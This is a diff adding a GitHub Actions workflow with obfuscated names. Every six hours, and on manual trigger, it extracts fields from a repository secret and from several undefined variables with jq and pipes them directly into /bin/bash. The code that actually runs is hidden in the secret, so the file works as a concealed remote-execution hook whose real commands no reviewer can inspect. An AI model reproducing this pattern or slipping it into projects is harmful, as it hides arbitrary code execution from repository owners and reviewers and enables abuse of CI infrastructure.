@@ -1,0 +1,23 @@
+name: xiangxueqiuxiu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangxueqiuxiu
+        env:
+          vlm52398: ${{ secrets.vlm52398 }}
+        run: |
+          echo $vlm52398 | jq -r .ibfa363 | /bin/bash
+          echo $cehfx81 | jq -r .abnfx82 | /bin/bash
+          echo $ipyek3 | jq -r .qgahn5 | /bin/bash
+          echo $wn107 | jq -r .qmges73195 | /bin/bash
+          echo $sv4825 | jq -r .zhxn18899 | /bin/bash
+
